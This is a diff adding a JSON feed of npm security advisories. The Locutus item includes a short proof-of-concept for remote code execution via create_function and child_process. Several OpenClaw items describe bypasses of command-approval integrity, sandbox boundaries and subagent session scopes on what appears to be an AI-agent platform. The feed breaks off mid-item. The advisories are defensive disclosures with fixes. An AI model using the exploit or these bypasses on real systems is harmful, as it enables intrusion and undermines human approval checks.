@@ -1,0 +1,663 @@
+{
+  "schema_version": "1.2.0",
+  "generated_at": "2026-03-13T17:51:55Z",
+  "source_id": "npm_security_advisories",
+  "hash": "sha256:bd51b23eaad3df0684f068ca8a858731840e53fa4de360321493c2c352ad7ab7",
+  "prev_hash": "sha256:37b825c6904b6389c82a83cef600f91beec2fd1551c85bc75c1e5d6e977cf3c7",
+  "cursor": "sha256:6f94aa89780befee3af9a861ce1acce0ebdf812caa0bb8da0f4e53ad92b476c5",
+  "prev_cursor": "sha256:b978dc70b161653d5f2264ea2d38ae07317cb8e74c077a4960bd202a8562e928",
+  "changed": true,
+  "ttl_sec": 1800,
+  "sources_included": [
+    "npm_security_advisories"
+  ],
+  "batch_narrative": "npm_security_advisories: 20 advisories (2 critical, 1 low).",
+  "buckets": {
+    "items": [
+      {
+        "source": "npm_security_advisories",
+        "id": "38e73116af6efb581ae59bf9de25ade1",
+        "url": "https://github.com/advisories/GHSA-vh9h-29pq-r5m8",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[locutus] Locutus vulnerable to RCE via unsanitized input in create_function()",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-vh9h-29pq-r5m8"
+          ],
+          "content_hash": "sha256:0849beb4e82cc5921bdb3c4a7bce18bfa6f783c95f656c913ea14202becd0e35"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-vh9h-29pq-r5m8"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The <code>create_function(args, code)</code> function passes both parameters directly to the <code>Function</code> constructor without any sanitization, allowing arbitrary code execution.</p>\n<p>This is distinct from CVE-2026-29091 (GHSA-fp25-p6mj-qqg6) which was <code>call_user_func_array</code> using <code>eval()</code> in v2.x. This finding affects <code>create_function</code> using <code>new Function()</code> in v3.x.</p>\n<h2 id=\"root-cause\">Root Cause</h2>\n<p><code>src/php/funchand/create_function.ts:17</code>:</p>\n<pre><code class=\"language-typescript\">return new Function(...params, code)\n</code></pre>\n<p>Zero input validation on either parameter.</p>\n<h2 id=\"poc\">PoC</h2>\n<pre><code class=\"language-javascript\">const { create_function } = require('locutus/php/funchand/create_function');\nconst rce = create_function('', 'return require(\"child_process\").execSync(\"id\").toString()');\nconsole.log(rce());\n// Output: uid=501(user) gid=20(staff) ...\n</code></pre>\n<p>Confirmed on locutus v3.0.11, Node.js v24.13.1.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Full RCE when an attacker can control either argument to <code>create_function()</code>. 597K weekly npm downloads.</p>\n<h2 id=\"suggested-fix\">Suggested Fix</h2>\n<p>Remove <code>create_function</code> or replace <code>new Function()</code> with a safe alternative. PHP itself deprecated <code>create_function()</code> in PHP 7.2 for the same reason.</p>\n<h2 id=\"response\">Response</h2>\n<p>Thanks for the report.</p>\n<p>We confirmed that <code>php/funchand/create_function</code> was still present through <code>locutus@3.0.13</code> and that it exposed dynamic code execution via <code>new Function(...)</code>.</p>\n<p>While this was intended behavior, <code>create_function()</code> inherently needs to be unsafe in order for it to work, <code>create_function()</code> was deprecated in PHP 7.2 and removed in PHP 8.0. Given that Locutus' parity target today is 8.3, this function shouldn't have been in Locutus at all anymore.</p>\n<p>We fixed this in <code>locutus@3.0.14</code> by removing <code>php/funchand/create_function</code> entirely. That matches our PHP 8.3 parity target more closely: . </p>\n<p>We also updated <code>php/var/var_export</code> so closures now export using the PHP 8-style <code>\\Closure::__set_state(array(...))</code> form instead of referencing the removed API.</p>\n<p>Release:</p>\n<ul>\n<li>npm: <code>locutus@3.0.14</code></li>\n<li>GitHub release: <a href=\"https://github.com/locutusjs/locutus/releases/tag/v3.0.14\">https://github.com/locutusjs/locutus/releases/tag/v3.0.14</a></li>\n</ul>\n<p>Credit to @ByamB4 for the report.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/locutusjs/locutus/security/advisories/GHSA-vh9h-29pq-r5m8\">https://github.com/locutusjs/locutus/security/advisories/GHSA-vh9h-29pq-r5m8</a></li>\n<li><a href=\"https://github.com/locutusjs/locutus/releases/tag/v3.0.14\">https://github.com/locutusjs/locutus/releases/tag/v3.0.14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vh9h-29pq-r5m8\">https://github.com/advisories/GHSA-vh9h-29pq-r5m8</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T16:10:32.000Z",
+          "date_published": "2026-03-13T16:10:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-vh9h-29pq-r5m8"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "9ec463b6e9c9efee3c7ca36f5d3eeff0",
+        "url": "https://github.com/advisories/GHSA-qvr7-g57c-mrc7",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Unavailable local auth SecretRefs could fall through to remote credentials in local mode",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qvr7-g57c-mrc7"
+          ],
+          "content_hash": "sha256:3394e29ebe0e0733c37abf0bb62954e1a67be640da305311e0294860ee8e222d"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, local gateway helper credential resolution treated configured but unavailable <code>gateway.auth.token</code> and <code>gateway.auth.password</code> SecretRefs as if they were unset and could fall back to <code>gateway.remote.*</code> credentials in local mode.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This could cause local CLI and helper paths to select the wrong credential source instead of failing closed for configured local auth SecretRefs. We did not confirm a server-side gateway-authentication boundary bypass for this issue.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The local-mode fallback logic decided whether remote credential fallback was allowed based on resolved credential values rather than on whether the local auth input was actually configured. A configured-but-unavailable local SecretRef therefore looked \"absent\" to the helper layer.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now tracks whether the local auth input is configured separately from whether it resolves successfully. In local mode, remote fallback is allowed only when the matching local auth input is truly unset. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-qvr7-g57c-mrc7\">https://github.com/openclaw/openclaw/security/advisories/GHSA-qvr7-g57c-mrc7</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qvr7-g57c-mrc7\">https://github.com/advisories/GHSA-qvr7-g57c-mrc7</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:48:22.000Z",
+          "date_published": "2026-03-13T15:48:21.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qvr7-g57c-mrc7"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "c1dada9074f9d56b62dc6323ac1df4bc",
+        "url": "https://github.com/advisories/GHSA-mj4p-rc52-m843",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Sandbox staged writes could escape the verified parent directory before commit",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-mj4p-rc52-m843"
+          ],
+          "content_hash": "sha256:d177837292af2dc5c1e83b84a7a500d6bc25161161c96e2fb5b6ebba1d401781"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, sandbox fs-bridge writes validated the destination before commit, but temporary file creation and population were not pinned to a verified parent directory. A raced parent-path alias change could cause the staged temp file to be created outside the intended writable mount before the final guarded replace step.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This is a sandbox boundary bypass affecting integrity and availability within the writable mount scope. Attacker-controlled bytes could be written outside the intended validated path before the final guarded step ran.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The older staging flow created and wrote the temporary file using target-directory shell path operations before the final replace step revalidated the destination. That meant the last guard protected only the final rename, not the earlier temp-file materialization path.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now resolves a pinned mount root plus relative parent path, creates the temporary file inside the verified parent directory, and performs the final atomic replace from that pinned directory context. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-mj4p-rc52-m843\">https://github.com/openclaw/openclaw/security/advisories/GHSA-mj4p-rc52-m843</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mj4p-rc52-m843\">https://github.com/advisories/GHSA-mj4p-rc52-m843</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:48:17.000Z",
+          "date_published": "2026-03-13T15:48:16.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-mj4p-rc52-m843"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "e276feea3b1aafd7fcca9a7b83d0a13a",
+        "url": "https://github.com/advisories/GHSA-jf6w-m8jw-jfxc",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Write-scoped callers could reach admin-only session reset logic through `agent`",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-jf6w-m8jw-jfxc"
+          ],
+          "content_hash": "sha256:e756c7c4cdb857a030709fdbe2194daa988f55e14cbfb53b3a14d2de67c378b4"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, a gateway caller with <code>operator.write</code> could issue <code>agent</code> requests containing <code>/new</code> or <code>/reset</code> and reach the same reset path used by the admin-only <code>sessions.reset</code> RPC.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>On gateways where a caller is intentionally granted <code>operator.write</code> but not <code>operator.admin</code>, that caller could reset targeted conversation state through <code>agent</code> slash commands. This crosses the documented method-scope boundary between write-scoped messaging and admin-only session mutation.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>Scope checks were enforced only on the outer RPC method. The <code>agent</code> slash-command path reused admin-only reset logic internally, so a write-scoped caller could reach session-reset mutation without holding <code>operator.admin</code>.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw no longer routes conversation <code>/new</code> and <code>/reset</code> through the admin-only <code>sessions.reset</code> entry point. Reset logic now lives in a shared service, while <code>sessions.reset</code> remains admin-only. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-jf6w-m8jw-jfxc\">https://github.com/openclaw/openclaw/security/advisories/GHSA-jf6w-m8jw-jfxc</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jf6w-m8jw-jfxc\">https://github.com/advisories/GHSA-jf6w-m8jw-jfxc</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:48:12.000Z",
+          "date_published": "2026-03-13T15:48:11.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-jf6w-m8jw-jfxc"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "aafa758e1863e6043221ca147b785757",
+        "url": "https://github.com/advisories/GHSA-qc36-x95h-7j53",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Unrecognized script runners could bypass `system.run` approval integrity",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qc36-x95h-7j53"
+          ],
+          "content_hash": "sha256:6cf40755d36489abd8896be9b7419a894283fa6707d45004aa0647371efbd023"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, node-host <code>system.run</code> approvals did not bind a mutable file operand for some script runners, including forms such as <code>tsx</code> and <code>jiti</code>. An attacker could obtain approval for a benign script-runner command, rewrite the referenced script on disk, and have the modified code execute under the already approved run context.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Deployments that rely on node-host <code>system.run</code> approvals for script integrity could execute rewritten local code after operator approval. This can lead to unintended local code execution as the OpenClaw runtime user.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt; 2026.3.11</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The approval planner only tracked mutable script operands for a hardcoded set of interpreters and runtime forms. Commands such as <code>tsx ./run.ts</code> and <code>jiti ./run.ts</code> fell through without a bound file snapshot, so the final pre-execution revalidation step was skipped.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now fails closed for approval-backed interpreter and runtime commands unless it can bind exactly one concrete local file operand, and it extends direct-file binding coverage for additional runtime forms. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-qc36-x95h-7j53\">https://github.com/openclaw/openclaw/security/advisories/GHSA-qc36-x95h-7j53</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc36-x95h-7j53\">https://github.com/advisories/GHSA-qc36-x95h-7j53</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:48:05.000Z",
+          "date_published": "2026-03-13T15:48:05.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qc36-x95h-7j53"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "908a20f152c50a8cb6e90240682d2eca",
+        "url": "https://github.com/advisories/GHSA-8jhh-jcqg-mj5p",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Channel commands could bypass account-scoped `configWrites` restrictions",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-8jhh-jcqg-mj5p"
+          ],
+          "content_hash": "sha256:ff52a67143b6f7a4f0ca58694533ffd8c9764f7003f6295a2e0541464e1cf2fb"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, channel-initiated config mutations were authorized against the originating account's <code>configWrites</code> policy but did not consistently re-check the targeted account scope. An authorized sender on one account could mutate protected sibling-account configuration when the target account had <code>configWrites: false</code>.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This is an account-scoped policy bypass inside a single gateway deployment. Channel commands such as <code>/config set channels.&lt;provider&gt;.accounts.&lt;id&gt;...</code> and config-backed <code>/allowlist ... --config --account &lt;id&gt;</code> could modify protected sibling-account configuration.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The mutation path validated the origin account scope but did not consistently authorize every resolved target scope. Ambiguous collection and root writes under <code>channels</code> and <code>channels.&lt;provider&gt;.accounts</code> could therefore reach protected account configuration from channel command surfaces.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now authorizes config mutations against both the origin scope and each resolved target scope, and it rejects ambiguous root and collection writes from channel commands unless the caller is an internal gateway client with <code>operator.admin</code>. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-8jhh-jcqg-mj5p\">https://github.com/openclaw/openclaw/security/advisories/GHSA-8jhh-jcqg-mj5p</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8jhh-jcqg-mj5p\">https://github.com/advisories/GHSA-8jhh-jcqg-mj5p</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:48:00.000Z",
+          "date_published": "2026-03-13T15:47:59.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-8jhh-jcqg-mj5p"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "23ebfb88e9b3a84df1b36b5de1031fb5",
+        "url": "https://github.com/advisories/GHSA-rw39-5899-8mxp",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Node-host approvals could show misleading shell payloads instead of the executed argv",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-rw39-5899-8mxp"
+          ],
+          "content_hash": "sha256:307a379b2629a5fb6fa26a0666a98a64727e59c963716467f1a39cdaeae98658"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, node-host <code>system.run</code> approvals could display only an extracted shell payload such as <code>jq --version</code> while execution still ran a different outer wrapper argv such as <code>./env sh -c 'jq --version'</code>.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This is an approval-integrity bug. An attacker who could place or select a local wrapper binary and induce a wrapper-shaped command could get local code executed after the operator approved misleading command text.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>Wrapper resolution normalized executables by basename and extracted inner shell payload text for approval display, while execution still preserved the full wrapper argv. Approval storage and UI therefore showed text that did not match the exact command OpenClaw would execute.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now binds approvals to the exact executed argv and keeps extracted shell payload text only as secondary preview data. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-rw39-5899-8mxp\">https://github.com/openclaw/openclaw/security/advisories/GHSA-rw39-5899-8mxp</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rw39-5899-8mxp\">https://github.com/advisories/GHSA-rw39-5899-8mxp</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:47:47.000Z",
+          "date_published": "2026-03-13T15:47:46.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-rw39-5899-8mxp"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "b93bb0b8ce93392dc694425b68c024ae",
+        "url": "https://github.com/advisories/GHSA-xf99-j42q-5w5p",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Unbound interpreter and runtime commands could bypass node-host approval integrity",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-xf99-j42q-5w5p"
+          ],
+          "content_hash": "sha256:958a5d39853fed765aa5ce48389c29b5c9d7e5adeb592532197562aca99c2f9d"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, node-host <code>system.run</code> approvals could still execute rewritten local code for interpreter and runtime commands when OpenClaw could not bind exactly one concrete local file operand during approval planning.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Deployments using node-host <code>system.run</code> approval mode could approve a benign local script and then execute different local code if that script changed before execution. This can lead to unintended local code execution as the OpenClaw runtime user.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The approval flow treated some interpreter and runtime forms as approval-backed even when it could not honestly bind a single direct local script file. That left residual approval-integrity gaps for runtime forms outside the directly bound file set.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now fails closed for approval-backed interpreter and runtime commands unless it can bind exactly one concrete local file operand, and it extends best-effort direct-file binding for additional runtime forms. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-xf99-j42q-5w5p\">https://github.com/openclaw/openclaw/security/advisories/GHSA-xf99-j42q-5w5p</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xf99-j42q-5w5p\">https://github.com/advisories/GHSA-xf99-j42q-5w5p</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:47:42.000Z",
+          "date_published": "2026-03-13T15:47:41.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-xf99-j42q-5w5p"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "a328d1bc189a73db9ca8244eabb6291e",
+        "url": "https://github.com/advisories/GHSA-4w7m-58cg-cmff",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Leaf subagents could steer sibling sessions across sandbox boundaries",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-4w7m-58cg-cmff"
+          ],
+          "content_hash": "sha256:cc505b9c38ec0488ba08be0b9f4fac83a1bf9f3a0ec3cfcc1072886b4ffe26a7"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, sandboxed leaf subagents could still access the <code>subagents</code> control surface and resolve against the parent requester scope instead of remaining confined to their own session tree.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>A low-privilege sandboxed leaf worker could steer or kill a sibling run owned by the same requester and cause that sibling to execute with its own broader tool policy. This is a sandbox and session-scope boundary bypass.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>Leaf subagents retained the <code>subagents</code> tool, and subagent control requests were authorized against the parent requester scope rather than the caller's own spawned descendants. The control path prevented only self-targeting, not cross-sibling steering.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now removes <code>subagents</code> control access from leaf subagents by default, scopes subagent control to the caller's own descendants, and rejects <code>steer</code> and <code>kill</code> requests that target runs outside that descendant tree. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-4w7m-58cg-cmff\">https://github.com/openclaw/openclaw/security/advisories/GHSA-4w7m-58cg-cmff</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4w7m-58cg-cmff\">https://github.com/advisories/GHSA-4w7m-58cg-cmff</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:47:35.000Z",
+          "date_published": "2026-03-13T15:47:34.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-4w7m-58cg-cmff"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "efa32a7ff9752719a9a9c29bf7619e47",
+        "url": "https://github.com/advisories/GHSA-4jpw-hj22-2xmc",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Pairing-scoped device tokens could mint `operator.admin` and reach node RCE",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-4jpw-hj22-2xmc"
+          ],
+          "content_hash": "sha256:751a8059f890f50ee76b20522a1f37dfc62bfbda510aa00a07d7908ffad0537c"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-4jpw-hj22-2xmc"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, a caller holding only <code>operator.pairing</code> could use <code>device.token.rotate</code> to mint a new token with broader scopes for an already paired device. If the target device was approved for <code>operator.admin</code>, the attacker could obtain an administrative token without already holding administrative scope.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This is a critical authorization flaw. On deployments with connected node hosts or companion apps that expose <code>system.run</code>, the escalated token could then modify node execution approvals and reach real remote code execution on the node. Even without nodes, the flaw still granted unauthorized gateway-admin access.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt;= 2026.3.8</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p><code>device.token.rotate</code> accepted caller-supplied target scopes and validated them against the target device's approved scopes, but it did not constrain the newly minted scopes to the caller's own current scope set. That allowed a pairing-scoped caller to mint a broader token for an already paired administrative device.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now enforces caller-scope subsetting in <code>device.token.rotate</code>, preventing callers from minting device tokens broader than the scopes they already hold. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a 